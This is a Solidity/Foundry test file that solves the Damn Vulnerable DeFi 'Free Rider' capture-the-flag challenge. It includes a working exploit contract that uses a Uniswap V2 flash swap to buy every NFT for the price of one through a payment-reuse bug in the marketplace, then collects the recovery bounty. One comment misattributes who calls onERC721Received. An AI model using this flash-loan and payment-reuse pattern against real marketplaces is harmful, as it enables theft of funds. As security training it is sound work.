// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Player starts with limited ETH balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                "builds/uniswap/UniswapV2Factory.json",
                abi.encode(address(0))
            )
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "builds/uniswap/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(token), address(weth))
        );

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{
            value: MARKETPLACE_INITIAL_ETH_BALANCE
        }(AMOUNT_OF_NFTS);

        // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);

        // Open offers in the marketplace
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager contract, adding the player as the beneficiary
        recoveryManager = new FreeRiderRecoveryManager{value: BOUNTY}(
            player,
            address(nft),
            recoveryManagerOwner,
            BOUNTY
        );

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        // Ensure deployer owns all minted NFTs.
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(
            nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner)
        );
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_freeRider() public checkSolvedByPlayer {
        FreeRiderAttacker rideAttack = new FreeRiderAttacker{value: 0.04 ether}(
            address(uniswapPair),
            address(marketplace),
            address(nft),
            address(recoveryManager),
            address(weth)
        );
        rideAttack.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // The recovery owner extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(
                address(recoveryManager),
                recoveryManagerOwner,
                tokenId
            );
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IFreeRideMarket {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract FreeRiderAttacker {
    IFreeRideMarket public market;
    IERC721 public nft;
    IWETH public weth;
    IUniswapV2Pair public uniswapPair;
    address public recoveryAccount;
    address public player;
    uint256 NFT_PRICE = 15 ether;
    uint256[] tokens = [0, 1, 2, 3, 4, 5];

    constructor(
        address _uniswapPair,
        address marketplace,
        address _nft,
        address recoveryManager,
        address _weth
    ) payable {
        market = IFreeRideMarket(marketplace);
        nft = IERC721(_nft);
        weth = IWETH(_weth);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        recoveryAccount = recoveryManager;
        player = msg.sender;
    }

    function attack() public {
        uniswapPair.swap(NFT_PRICE, 0, address(this), "0x"); //asking for flashLoan
    }

    function uniswapV2Call(
        address,
        uint256, ///amount0,
        uint256, //amount1,
        bytes calldata
    ) external {
        require(msg.sender == address(uniswapPair), "Not Uniswap Pair");
        require(tx.origin == player, "Not Player");
        weth.withdraw(NFT_PRICE);
        market.buyMany{value: NFT_PRICE}(tokens); // i have only 15 ether but i can buy all the 6 nfts ,because of vulnerability in the marketplace
        bytes memory data = abi.encode(player);
        for (uint256 i = 0; i < tokens.length; i++) {
            nft.safeTransferFrom(address(this), recoveryAccount, i, data);
        }

        uint256 amountTopay = NFT_PRICE + ((NFT_PRICE * 3) / 997) + 1; //
        weth.deposit{value: amountTopay}();
        weth.transfer(address(uniswapPair), amountTopay);

        //why this is mandatory onERC721Received ?:
        // The Uniswap V2 pair will call this function to confirm the transfer of NFTs
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
